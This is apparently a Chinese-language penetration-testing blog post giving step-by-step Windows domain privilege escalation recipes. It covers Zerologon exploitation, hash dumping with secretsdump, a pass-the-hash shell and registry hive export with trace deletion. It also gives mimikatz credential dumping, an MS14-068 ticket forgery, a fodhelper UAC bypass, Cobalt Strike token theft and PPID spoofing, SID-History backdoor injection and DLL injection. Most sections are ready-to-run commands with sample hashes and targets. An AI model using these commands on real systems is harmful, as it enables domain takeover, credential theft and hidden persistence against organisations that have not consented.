# CVE-2020-1472（域内提权）

  * 漏洞环境：  
域控：windows server 2012 R2

  * 利用过程：  
将域控密码设置为空->读取hash->读取sam文件hash(ntds.dit)->恢复域控密码

### 1.首先验证是否有漏洞

我们使用这个工具 https://github.com/SecuraBV/CVE-2020-1472

    
    
    python zerologon_tester.py 域控主机名 域控地址
    
    
    
    python zerologon_tester.py dc 172.16.253.1
    

![](https://image.3001.net/images/20210914/1631613422_614071ee3eda26106cdbb.png!small)  
返回success，说明存在漏洞

### 2\. 重置域账号

我们使用这个工具https://github.com/dirkjanm/CVE-2020-1472  
但要先安装要安装impacket(https://github.com/SecureAuthCorp/impacket)  
安装方法：`python -m pip install .`  
然后执行 `python cve-2020-1472-exploit.py 域控主机名 域控地址`  
![](https://image.3001.net/images/20210914/1631613422_614071eed114759c13571.png!small)  
注意：这时候密码已经置空

### 3.读取域控中的hash

我们用impacket中的/impacket/examples/ **secretsdump.py**

    
    
    # windows
    python secretsdump.py DOMAIN/DC_NETBIOS_NAME$@DC_IP_ADDR -just-dc -no-pass
    
    python secretsdump.py yuaneuro.cn/dc$@172.16.253.1 -just-dc -no-pass
    

![](https://image.3001.net/images/20210914/1631613423_614071efa0460d4eda373.png!small)

### 4.获取shell

获取到HASH之后接下来我们就可以利用wmiexec.py登录，从而获取一个SHELL

    
    
    python wmiexec.py -hashes <HASH> DOMAIN/DOMAIN_USER@DC_IP_ADDR
    
    python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7ab0ec168b0aabb2f20d4de20e4961d4 yuaneuro.cn/administrator@172.16.253.1 -codec gbk
    

![](https://image.3001.net/images/20210914/1631613424_614071f043cbbb03fab94.png!small)

至此，我们就成功获取到了域控的shell，做完权限位置后，我们要恢复域控的密码，不然域控会脱域。

### 5\. 导出SAM中原来的hash

首先利用注册表命令将目标机的sam或者system文件导出，然后清除痕迹

    
    
    reg save HKLM\SYSTEM system.save
    reg save HKLM\SAM sam.save
    reg save HKLM\SECURITY security.save
    get system.save
    get sam.save
    get security.save
    del /f system.save
    del /f sam.save
    del /f security.save
    exit
    

这样可以获取域控脱域之前本地保存的hash

### 6\. 解析hash

    
    
    secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
    

![](https://image.3001.net/images/20210914/1631613424_614071f0d3d6076845ece.png!small)

### 7\. 恢复hash

    
    
    python reinstall_original_pw.py dc 172.16.253.1 3d6830f709a494680a6c7f6f0ee35386bd2a30cc5fb5c1809c19b0666292cc...
    

![](https://image.3001.net/images/20210914/1631613425_614071f1756a883d5cfac.png!small).

# MS14-068(server2012以下系统可用)

ms14-068利用的条件有4个

  1. 域用户

  2. 域控名

  3. 域用户密码  
使用mimikatz抓取密码：  
`mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" > 1.txt`  
![](https://image.3001.net/images/20210914/1631613426_614071f2125322dbee606.png!small)

  4. 域用户sid  
`whoami /user`

  5. 域ip

  * 利用ms14-068.exe 工具生成伪造的kerberos协议认证证书

    
    
    MS14-068.exe -u <userName>@<domainName> -p <clearPassword> -s <userSid> -d <domainControlerAddr>
    
    
    
    MS14-068.exe -u testuser@yuaneuro.cn -p qwe123@Q -s S-1-5-21-3398013025-58582661-3905515547-1103 -d 172.16.253.1
    

![](https://image.3001.net/images/20210914/1631613426_614071f29ddfeb56d938c.png!small)

  * 然后使用mimikatz将证书写入，从而提升为域管理员

    
    
    kerberos::purge
    kerberos::ptc TGT_testuser@yuaneuro.cn.ccache
    

![](https://image.3001.net/images/20210914/1631613428_614071f4869d877c5f4a0.png!small)  
![](https://image.3001.net/images/20210914/1631613429_614071f51d9ab07f827cb.png!small)

# bypass UAC

  1. 自动提升（autoElevate）  
原理：具有autoElevate属性为True的应用程序会在 **启动时自动提升权限**
，而这些应用程序往往都具备微软的签名，微软认为它是可信的。故此，在该程序启动时，将会以管理员身份启动。

![](https://image.3001.net/images/20210914/1631613429_614071f5a10ec7924cc0f.png!small)  
 **fodhelper.exe**
是win10中引入的，位置在：C:\Windows\System32\fodhelper.exe，因为它使用微软的证书签名软件并位于一个受信任的位置，最重要的是它
**autoElevate属性为True，允许自动升级，不需要任何交互来允许进程升级**

启动 fodhelper.exe 时，会检查注册表  
`HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command`和`HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command\DelegateExecute`，如果存在则会执行第一个里面的值。

所以我们可以在注册表中创建此结构：

    
    
    reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Windows\System32\cmd.exe /f
    reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f
    fodhelper.exe
    reg delete HKEY_CURRENT_USER\Software\Classes\ms-settings\ /f
    

![](https://image.3001.net/images/20210914/1631613430_614071f6422cf72b658cb.png!small)![](https://image.3001.net/images/20210914/1631613430_614071f6cf1e23700c59f.png!small)

  2. DLL劫持  
原理：首先生成编译好的DLL，并执行自动高权限的程序取加载DLL  
![](https://image.3001.net/images/20210914/1631613431_614071f75fc7fffc95cc2.png!small)  
使用cs的uac-token-duplication提权模块也可以bypassuac  
![](https://image.3001.net/images/20210914/1631613431_614071f7edd0c9d0edc6e.png!small)

# CVE-2015-1701(内核特权提升漏洞)

exp：https://github.com/hfiref0x/CVE-2015-1701  
直接运行就行了![](https://image.3001.net/images/20210914/1631613433_614071f973512991f3150.png!small)

# MS16-032，CVE-2016-0099(逻辑漏洞)

exp：https://github.com/zcgonvh/MS16-032  
![](https://image.3001.net/images/20210914/1631613434_614071fa1e80b9f489eb5.png!small)

# CVE-2020-0787 (本地提权)

exp：https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION  
![](https://image.3001.net/images/20210914/1631613434_614071fad5bf0da1fe37a.png!small)

# Token窃取与冒用

  * 使用 `DuplicateToken(Ex)`函数创建一个新的访问令牌，该令牌复制自现有令牌。然后可以将该令牌用于 `ImpersonateLoggedOnUser`函数，允许调用线程模拟已登录用户的安全上下文，或者使用 `SetThreadToken`函数将模拟令牌分配给线程。当目标用户在系统上具有非网络登录会话时，这很有用。

这里我们使用Cobalt Strike做演示：

首先我们以testuser用户上线，使用bypassuac提权至管理员。

  * 窃取token：  
打开Process List  
![](https://image.3001.net/images/20210914/1631613435_614071fbd92c44fc37a58.png!small)  
我们看到这里有域管理员的账号登录  
![](https://image.3001.net/images/20210914/1631613436_614071fc9962b03a6834c.png!small)  
点击steal或者输入`steal_token {pid}`就可以窃取凭证了

![](https://image.3001.net/images/20210914/1631613437_614071fd46f63a8368a57.png!small)

此时就可以访问域控了  
![](https://image.3001.net/images/20210914/1631613438_614071fedd7bdd24be48f.png!small)  
使用 `rev2self`可移除当前窃取的令牌  
![](https://image.3001.net/images/20210914/1631613439_614071ff6fa77241343bf.png!small)

# 父进程PPID欺骗

  * 通常在检查中，通过对父子进程间关系的检测来判断该进程是否存在异常，使用父进程欺骗可以逃避进程监视防御或提升特权。

首先我们使用cs生成一个木马在受害端执行。  
![](https://image.3001.net/images/20210914/1631613440_6140720007eb8344a7823.png!small)  
查看进程可看到默认的父进程ppid是464  
![](https://image.3001.net/images/20210914/1631613440_614072008589255607824.png!small)

我们点击右键选择`Set as PPID`,  
![](https://image.3001.net/images/20210914/1631613441_6140720113e6a811d3283.png!small)  
或者直接输入`ppid {ppid}`  
![](https://image.3001.net/images/20210914/1631613441_61407201927469213bda1.png!small)  
然后派生一个会话，选择一个listener，然后我们查看进程  
![](https://image.3001.net/images/20210914/1631613442_61407202113f415e818de.png!small)  
可以看到父进程已经成2556了

或者如果在机器上有更高权限的用户存在，我们也可以将父pid设置成高权限账户的进程：  
![](https://image.3001.net/images/20210914/1631613442_614072029d77bc6e91856.png!small)  
这样派生出来的会话也是域管理员的权限的会话。

# SID-History注入(后门)

  * 原理：windows中的sid是独一无二的，用于标识用户或组帐户。帐户可以在`SID-History Active Directory 属性`中保存额外的 SID，允许域之间的可互操作帐户迁移。所以我们可以使用管理员权限将管理员等用户的SID插入到SID-History中，以此提升权限。

首先在域控执行mimikatz  
`privilege::debug`，提升权限，  
`sid::patch`，对域控LDAP修改过程中的验证函数进行patch，patch共分为两个步骤，如果仅第一步patch成功的话，那么可以使用sid::add功能，两步都patch成功的话才可以使用sid::modify功能，  
`sid::add /sam:test /new:administrator`，将administrator的SID添加到hack的SID
History属性中。

# DLL注入

首先使用cs生成一个dll  
![](https://image.3001.net/images/20210914/1631613443_614072033ab7a55657222.png!small)  
然后`RemoteDLLInjector64`使用CreateRemoteThread将DLL注入到进程中

    
    
    RemoteDLLInjector64.exe {PID} {DLL_path}
    

![](https://image.3001.net/images/20210914/1631613443_61407203d464d264acdc6.png!small)  
然后就可以得到一个system权限的会话  
![](https://image.3001.net/images/20210914/1631613444_614072048166470545f9e.png!small)

